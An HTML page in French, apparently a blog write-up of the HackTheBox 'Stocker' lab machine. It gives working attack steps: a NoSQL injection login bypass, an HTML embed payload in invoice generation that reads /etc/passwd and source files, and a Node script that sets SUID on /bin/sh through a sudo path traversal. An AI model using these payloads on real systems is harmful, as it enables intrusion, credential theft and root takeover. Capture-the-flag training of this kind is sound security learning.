<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="BlackcatRS "><meta name=description content="Table of Contents Énumération Login bypass Privilege escalation Énumération Scanner la machine :
sudo nmap -sC -sV -T4 10.10.11.196 -sC : Scanner la cible en utilisant les scripts par défaut -sV : Déterminer la version du service en cours d&amp;rsquo;exécution sur le port.
Résultat du scan Nmap :
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET Nmap scan report for 10.10.11.196 Host is up (0.012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta name=keywords content=",CTF,HackTheBox,HTB_Easy"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://www.atomicl.net/ctf/hackthebox/stocker/writeup/><title>HackTheBox - Stocker :: BlackcatRS</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://www.atomicl.net/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=https://www.atomicl.net/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://www.atomicl.net/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://www.atomicl.net/favicon-16x16.png><link rel=manifest href=https://www.atomicl.net/site.webmanifest><link rel=mask-icon href=https://www.atomicl.net/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://www.atomicl.net/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="HackTheBox - Stocker"><meta itemprop=description content="Table of Contents Énumération Login bypass Privilege escalation Énumération Scanner la machine :
sudo nmap -sC -sV -T4 10.10.11.196 -sC : Scanner la cible en utilisant les scripts par défaut -sV : Déterminer la version du service en cours d&rsquo;exécution sur le port.
Résultat du scan Nmap :
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET Nmap scan report for 10.10.11.196 Host is up (0.012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta itemprop=datePublished content="2022-09-11T14:19:02+02:00"><meta itemprop=dateModified content="2022-09-11T14:19:02+02:00"><meta itemprop=wordCount content="894"><meta itemprop=image content="https://www.atomicl.net"><meta itemprop=keywords content="CTF,HackTheBox,HTB_Easy,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.atomicl.net"><meta name=twitter:title content="HackTheBox - Stocker"><meta name=twitter:description content="Table of Contents Énumération Login bypass Privilege escalation Énumération Scanner la machine :
sudo nmap -sC -sV -T4 10.10.11.196 -sC : Scanner la cible en utilisant les scripts par défaut -sV : Déterminer la version du service en cours d&rsquo;exécution sur le port.
Résultat du scan Nmap :
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET Nmap scan report for 10.10.11.196 Host is up (0.012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:title" content="HackTheBox - Stocker"><meta property="og:description" content="Table of Contents Énumération Login bypass Privilege escalation Énumération Scanner la machine :
sudo nmap -sC -sV -T4 10.10.11.196 -sC : Scanner la cible en utilisant les scripts par défaut -sV : Déterminer la version du service en cours d&rsquo;exécution sur le port.
Résultat du scan Nmap :
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET Nmap scan report for 10.10.11.196 Host is up (0.012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:type" content="article"><meta property="og:url" content="https://www.atomicl.net/ctf/hackthebox/stocker/writeup/"><meta property="og:image" content="https://www.atomicl.net"><meta property="article:section" content="CTF"><meta property="article:published_time" content="2022-09-11T14:19:02+02:00"><meta property="article:modified_time" content="2022-09-11T14:19:02+02:00"><meta property="article:published_time" content="2022-09-11 14:19:02 +0200 +0200"></head><body><div class=container><header class=header><span class=header__inner><a href=https://www.atomicl.net/ style=text-decoration:none><div class=logo><span class=logo__mark>BlackcarRS ~</span>
<span class=logo__text></span><span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://www.atomicl.net/about/>A propos</a></li><li><a href=https://www.atomicl.net/posts/>Posts</a></li><li><a href=https://www.atomicl.net/tags/>Tags</a></li><li><a href=https://www.atomicl.net/tutoriels/>Tutoriels</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://www.atomicl.net/ctf/hackthebox/stocker/writeup/>HackTheBox - Stocker</a></h2><div class=post-content><h1 id=table-of-contents>Table of Contents</h1><ol><li><a href=#orgdb33982>Énumération</a></li><li><a href=#org9bdb05c>Login bypass</a></li><li><a href=#orgd35c395>Privilege escalation</a></li></ol><p></p><h1 id=énumération>Énumération</h1><p>Scanner la machine :</p><pre><code>sudo nmap -sC -sV -T4 10.10.11.196
</code></pre><p>-sC : Scanner la cible en utilisant les scripts par défaut
-sV : Déterminer la version du service en cours d&rsquo;exécution sur le port.</p><p>Résultat du scan Nmap :</p><pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:08 CET
Nmap scan report for 10.10.11.196
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
</code></pre><p>La machine cible héberge un serveur web pour le nom de domaine stocker.htb, ajoutons donc dans /etc/hosts afin de consulter la page web:</p><pre><code>sudo su -c &quot;echo '\n#Hack The Box - Stocker\n10.10.11.196    stocker.htb' &gt;&gt; /etc/hosts&quot;
</code></pre><p>Maintenant le site web a l&rsquo;url <a href=http:stocker.htb>stocker.htb</a>, pas d&rsquo;info sensible dans le code source du site web. Essayons donc les 3 types d&rsquo;énumération qu&rsquo;on peut effectuer sur un service HTTP.</p><ol><li><p>Énumération de fichiers avec Gobuster</p><p>gobuster dir -u <a href=http://stocker.htb/>http://stocker.htb/</a> -w $HOME/.local/bin/SecLists/Discovery/Web-Content/raft-medium-files.txt</p></li></ol><p>dir : Utiliser le mode d&rsquo;énumération répertoire ou fichier
-u : URL cible</p><p><a href=gobuster_file_enum.png>Resultat de enum de fichiers</a></p><ol><li><p>Énumération de dossier avec Gobuster</p><p>gobuster dir -u <a href=http://stocker.htb/>http://stocker.htb/</a> -w $HOME/.local/bin/SecLists/Discovery/Web-Content/raft-medium-directories.txt</p></li></ol><p><a href=gobuster_dir_enum.png>Resultat de enum de repertoires</a></p><ol><li><p>Énumération de sous-domaines avec Gobuster</p><p>gobuster vhost -u <a href=http://stocker.htb/>http://stocker.htb/</a> -w $HOME/.local/binSecLists/Discovery/DNS/subdomains-top1million-5000.txt &ndash;append-domain</p></li></ol><p>–append-domain : Ajouter le domaine de l&rsquo;URL aux mots du wordlist. Sinon, FQDN doivent être spécifiés dans le wordlist.</p><p>vhost a été utilisé à la place de dns afin d&rsquo;éviter la résolution de nom de domaine car stocker.htb est un nom de domaine que nous avons fait pointé vers l&rsquo;adresse IP de la machine et ce n&rsquo;est pas un vrai nom de domaine.</p><p><a href=gobuster_dns_enum.png>Resultat de enum de sous-domaines</a> - Une page de login est accessible a l&rsquo;adresse <a href=http://dev.stocker.htb>http://dev.stocker.htb</a> dont dirige vers <a href=http://dev.stocker.htb/login>http://dev.stocker.htb/login</a>.</p><p>Ajouter le sous-domaine dans le fichier /etc/hosts :</p><pre><code>sudo su -c &quot;echo '10.10.11.196    dev.stocker.htb' &gt;&gt; /etc/hosts&quot;
</code></pre><p></p><h1 id=login-bypass>Login bypass</h1><p>Utiliser Sqlmap pour trouver des injection SQL en utilisant la requête POST capturé en utilisant Burpsuite :</p><pre><code>sqlmap -r post_req.txt
</code></pre><p>Rien d&rsquo;intéressant.</p><p>Essayons maintenant NOSQL injection en modifiant Content-Type et le payload sous format json :</p><pre><code>POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
Connection: close

{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} } 
</code></pre><p>Maintenant nous avons bien authentifié et essayons maintenant de commander quelque choses, ares avoir valide nous une facture confirme l&rsquo;achat. Cette facture a été généré dynamiquement, essayons maintenant <strong>template injection</strong>.</p><p>Capturer la phase de validation de la commande avec Burpsuite et modifier le champs dont est utilisé automatiquement pour générer des facture avec diffèrent nom.</p><pre><code>POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 163
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
Connection: close

{&quot;basket&quot;:[
{
&quot;_id&quot;:&quot;638f116eeb060210cbd83a8f&quot;,
&quot;title&quot;:&quot;Bin&quot;,
&quot;description&quot;:&quot;It's a rubbish bin.&quot;,
&quot;image&quot;:&quot;bin.jpg&quot;,
&quot;price&quot;:76,
&quot;currentStock&quot;:15,
&quot;__v&quot;:0,&quot;amount&quot;:1
}]}
</code></pre><p>Remplacer le champ &ldquo;title&rdquo; avec :</p><pre><code>POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 163
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
Connection: close

{&quot;basket&quot;:[
{
&quot;_id&quot;:&quot;638f116eeb060210cbd83a8f&quot;,
&quot;title&quot;:&quot;&lt;embed type='text/html' src='file:///etc/passwd'  width='300' height='600'&quot;,
&quot;description&quot;:&quot;It's a rubbish bin.&quot;,
&quot;image&quot;:&quot;bin.jpg&quot;,
&quot;price&quot;:76,
&quot;currentStock&quot;:15,
&quot;__v&quot;:0,&quot;amount&quot;:1
}]}
</code></pre><p>Cela nous afficher le contenu de la page passwd sur la facture. En utilisant cette méthode nous pouvons afficher le contenu des fichiers sensible :</p><pre><code>POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 163
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AsH-VNc_skdNFAztIj3l2F8O_1gy18jDb.xUeL%2FX4DV1riM8kVcfj6PZTFohLW2BjHVViIypQnT2o
Connection: close

{&quot;basket&quot;:[
{
&quot;_id&quot;:&quot;638f116eeb060210cbd83a8f&quot;,
&quot;title&quot;:&quot;&lt;embed type='text/html' src='file:///var/www/dev/index.js'  width='500' height='700'&quot;,
&quot;description&quot;:&quot;It's a rubbish bin.&quot;,
&quot;image&quot;:&quot;bin.jpg&quot;,
&quot;price&quot;:76,
&quot;currentStock&quot;:15,
&quot;__v&quot;:0,&quot;amount&quot;:1
}]}
</code></pre><p>Le fichier index.js contient un mot de passe ***, essayons de se connecter au serveur stocker.htb en SSH avec le nom d&rsquo;utilisateur &ldquo;angoose&rdquo;.</p><pre><code>ssh angoose@stocker.htb
</code></pre><p>Le flag de l&rsquo;utilisateur se trouve dans /home/angoose/user.txt</p><p></p><h1 id=privilege-escalation>Privilege escalation</h1><p>Essayons maintenant de trouver un moyen de élevé le privilège, vérifies les privilège sudo d&rsquo;utilisateur angoose en utilisant sudo -l.
Angoose peut exécuter les script JS qui se trouve dans le dossier /usr/local/scripts/*.js en tant que root. Créerons un script JS afin de assigner un <strong>Setuid</strong> pour pouvoir exécuter en tant que root.</p><p>Essayons de créer un script exploit.js dans le dossier /tmp afin d&rsquo;assigner Setuid :</p><pre><code>const { exec } = require('node:child_process');
// Set SetUID
exec('chmod u+s /bin/sh', (err, output) =&gt; {
	// Check for error
	if(err) {
		console.error('Unable to setUID', err)
		return
	}
	// Message on success
	console.log('Sucess', output)
})
</code></pre><p>Exécuter le script depuis dossier /usr/local/scripts car l&rsquo;exécution du script est autoriser uniquement depuis ce dossier :</p><pre><code>sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js
</code></pre><p>Maintenant nous pouvons exécuter /bin/sh en tant que root grâce a SetUID, exécuter /bin/sh avec option -p permet de exécuter en tant que root et non angoose.</p><pre><code>sudo /bin/sh -p
</code></pre><p>Le flag se trouve dans le ficher /root/root.txt.</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://www.atomicl.net/tags/ctf/>CTF</a></span>
<span class=tag><a href=https://www.atomicl.net/tags/hackthebox/>HackTheBox</a></span>
<span class=tag><a href=https://www.atomicl.net/tags/htb_easy/>HTB_Easy</a></span></p></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2023</span>
<span><a href=https://www.atomicl.net>BlackcatRS</a></span>
<span><a href=https://www.atomicl.net/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084; by <a href=https://github.com/panr/hugo-theme-hello-friend>Hello Friend</a></span></div></div></footer></div><script type=text/javascript src=https://www.atomicl.net/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr+gb19lZ12F8/h/HMGKqgrTh+oMNaUEZPSy93w=="></script></body></html>